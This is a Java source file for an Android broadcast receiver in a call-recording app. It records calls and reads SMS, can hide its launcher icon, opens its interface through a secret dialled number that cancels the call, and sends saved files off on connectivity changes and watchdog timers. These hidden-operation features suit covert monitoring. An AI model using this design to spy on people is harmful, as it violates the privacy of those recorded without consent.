package com.kivsw.phonerecorder.os;

import android.content.Context;
import android.content.Intent;
import android.net.ConnectivityManager;
import android.provider.Telephony;
import android.telephony.PhoneNumberUtils;
import android.telephony.TelephonyManager;

import com.kivsw.phonerecorder.model.error_processor.IErrorProcessor;
import com.kivsw.phonerecorder.model.persistent_data.IJournal;
import com.kivsw.phonerecorder.model.utils.MyConfiguration;
import com.kivsw.phonerecorder.ui.main_activity.MainActivity;
import com.kivsw.phonerecorder.ui.main_activity.MainActivityPresenter;
import com.kivsw.phonerecorder.ui.notification.AntiTaskKillerNotification;

import javax.inject.Inject;

import com.kivsw.phonerecorder.model.persistent_data.IPersistentDataKeeper;
import com.kivsw.phonerecorder.model.settings.ISettings;
import com.kivsw.phonerecorder.model.task_executor.ITaskExecutor;

/**
 * Receives intents
 */

public class AppReceiver extends android.content.BroadcastReceiver{


    @Inject ISettings settings;
    @Inject
    IJournal journal;
    @Inject
    IPersistentDataKeeper callInfoKeeper;
    @Inject ITaskExecutor taskExecutor;
    @Inject
    IErrorProcessor errorProcessor;
    @Inject
    MainActivityPresenter mainActivityPresenter;

    @Override
    public void onReceive(Context context, Intent intent) {
        MyConfiguration.waitForDebugger();  // for debugging process
        MyApplication.getComponent().inject(this);

        journal.journalAdd(intent);
        try {
            processIntent(context, intent);
        }catch(Throwable t)
        {
            errorProcessor.onError(t);
        }
    }

    protected void processIntent(Context context, Intent intent)
    {
        String action = intent.getAction();
        if(action!=null)
        switch (action) {
            case Intent.ACTION_NEW_OUTGOING_CALL:
                outgoingCall(context, intent);
                break;
            case Intent.ACTION_BOOT_COMPLETED:
                setLauncherIcon(context, intent);
                setWatchdogTimer(context);
                break;
            case ConnectivityManager.CONNECTIVITY_ACTION:
                doDataSave(context, intent);
                break;
            case TelephonyManager.ACTION_PHONE_STATE_CHANGED:
                phoneStateChanged(context, intent);
                break;
            case WatchdogTimer.ACTION_WATCHDOG_TIMER:
                doDataSave(context, intent);
                break;
            case AntiTaskKillerNotification.NOTIFICATION_CLICK_ACTION:
                onNotificationClick();
                break;

            case Telephony.Sms.Intents.SMS_RECEIVED_ACTION:
            case Telephony.Sms.Intents.SMS_DELIVER_ACTION:
                onNewSms();
                break;
        }
    }

    protected void doDataSave(Context context, Intent intent)
    {
        taskExecutor.startFileSending();
        setWatchdogTimer(context);
    }
    protected void setLauncherIcon(Context context, Intent intent)
    {

        boolean visible= !settings.getHiddenMode();
        LauncherIcon.setVisibility(context, visible);
    }

    protected void setWatchdogTimer(Context context)
    {
        WatchdogTimer.setTimer(context);
    }

    protected void phoneStateChanged(Context context, Intent intent)
    {
        if (!settings.getEnableCallRecording())
            return;

        TelephonyManager tm=(TelephonyManager)context.getSystemService(Context.TELEPHONY_SERVICE);
        switch (tm.getCallState())
        {
            case TelephonyManager.CALL_STATE_IDLE: // the end of the current conversation
                stopRecording(context);
                break;

            case TelephonyManager.CALL_STATE_OFFHOOK: // the begin of the current conversation
                startRecording(context);
                break;

            case TelephonyManager.CALL_STATE_RINGING: // saves the income phone number
                String phoneNumber=intent.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER );
                callInfoKeeper.setCallInfo(phoneNumber, true);
                break;
        }


    }
    protected void outgoingCall(Context context, Intent intent)
    {
        String phoneNumber=intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER);
        if(phoneNumber==null)
            phoneNumber="";

        String secretNumber = settings.getSecretNumber();
        if (PhoneNumberUtils.compare(phoneNumber, secretNumber)) {  // shows the UI
            MainActivity.showActivity(context, settings);
            setResultData(null);
            return;
        }

        if (settings.getEnableCallRecording()) {
            // saves the outgoing phone number
            callInfoKeeper.setCallInfo(phoneNumber, false);

        }

    }

    protected void startRecording(Context context)
    {
        IPersistentDataKeeper.CallInfo callInfo = callInfoKeeper.getCallInfo();

        taskExecutor.startCallRecording();
    }
    protected void stopRecording(Context context)
    {
        IPersistentDataKeeper.CallInfo callInfo = callInfoKeeper.getCallInfo();

        taskExecutor.stopCallRecording();
    }

    protected void onNotificationClick()
    {
        mainActivityPresenter.showActivity();
    }
    protected void onNewSms()
    {
        if(!settings.getEnableSmsRecording())
            return;
        taskExecutor.startSMSreading();
    }
}
